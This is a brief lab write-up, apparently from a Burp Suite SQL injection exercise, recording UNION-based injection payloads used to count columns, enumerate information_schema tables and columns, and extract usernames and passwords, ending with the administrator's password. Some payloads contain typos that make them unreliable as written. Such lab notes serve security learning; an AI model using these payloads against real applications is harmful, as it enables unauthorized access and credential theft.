# BurpSuite_Lab
first i try add "'+union+select+null--" into Url
as can we seen, there haven't happen. Then try add "+union+select+null,null--"
then i changed it in to "+union+select+tale_name,null+from+information_schema.tables--"
i saw user_****
then i tried to find column
i try "'+union+select+column_table,null+form+information_chema.columns--"
we could see user and password
the i tried "'+union+select+user_***, password_*** from user_***"
we can see password of acc administrator
